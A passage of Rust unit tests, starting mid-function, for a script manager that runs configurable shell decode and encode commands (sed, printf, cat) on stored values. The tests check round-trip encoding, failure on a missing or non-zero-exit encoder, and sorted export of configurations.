            // Decode strips the "MAGIC:" header; encode prepends "MAGIC:".
            cfg.shell_command = "sed 's/^MAGIC://' {RAW_FILE}".to_string();
            cfg.encode_command = "printf 'MAGIC:%s' {VALUE}".to_string();
            ScriptManager::upsert("sc-bi", cfg).expect("upsert");

            assert!(ScriptManager::has_encoder_for_key("sc-bi-srv", "enc:1"));
            assert!(!ScriptManager::has_encoder_for_key("sc-bi-srv", "other:1"));

            let encoded = ScriptManager::encode_for_key("sc-bi-srv", "enc:1", "hello world").expect("encode");
            assert_eq!(encoded, b"MAGIC:hello world");

            let decoded = ScriptManager::execute("sc-bi", "enc:1", &encoded).expect("decode");
            assert_eq!(decoded, "hello world");

            ScriptManager::delete("sc-bi").expect("cleanup");
        }

        #[test]
        #[cfg(not(target_os = "windows"))]
        fn encode_fails_when_missing_or_nonzero_exit() {
            setup();
            // Decode-only script (no encode_command).
            let decode_only = config("sc-ro-srv", "ro:", MatchMode::Prefix);
            ScriptManager::upsert("sc-ro", decode_only).expect("upsert");
            assert!(!ScriptManager::has_encoder_for_key("sc-ro-srv", "ro:1"));
            assert!(ScriptManager::encode_for_key("sc-ro-srv", "ro:1", "test").is_err());

            // Failing encode_command exits non-zero and never returns partial/empty bytes as Ok.
            let mut failing = config("sc-fail-srv", "fail:", MatchMode::Prefix);
            failing.encode_command = "echo 'invalid payload' >&2; exit 2".to_string();
            ScriptManager::upsert("sc-fail", failing).expect("upsert");
            assert!(ScriptManager::has_encoder_for_key("sc-fail-srv", "fail:1"));
            let err =
                ScriptManager::encode_for_key("sc-fail-srv", "fail:1", "bad").expect_err("non-zero encoder must fail");
            assert!(err.to_string().contains("invalid payload"), "{err}");

            ScriptManager::delete("sc-ro").expect("cleanup");
            ScriptManager::delete("sc-fail").expect("cleanup");
        }

        #[test]
        fn export_all_returns_sorted_configs() {
            setup();
            let mut c1 = config("sc-exp-srv", "b:", MatchMode::Prefix);
            c1.name = "zeta-viewer".to_string();
            let mut c2 = config("sc-exp-srv", "a:", MatchMode::Prefix);
            c2.name = "alpha-viewer".to_string();
            c2.encode_command = "cat {RAW_FILE}".to_string();
            ScriptManager::upsert("sc-exp-1", c1).expect("upsert 1");
            ScriptManager::upsert("sc-exp-2", c2).expect("upsert 2");

            let exported: Vec<ScriptConfig> = ScriptManager::export_all()
                .into_iter()
                .filter(|c| c.server_id == "sc-exp-srv")
                .collect();
            assert_eq!(exported.len(), 2);
            assert_eq!(exported[0].name, "alpha-viewer");
            assert!(exported[0].has_encoder());
            assert_eq!(exported[1].name, "zeta-viewer");
            assert!(!exported[1].has_encoder());

            ScriptManager::delete("sc-exp-1").expect("cleanup 1");
            ScriptManager::delete("sc-exp-2").expect("cleanup 2");
        }
    }
}
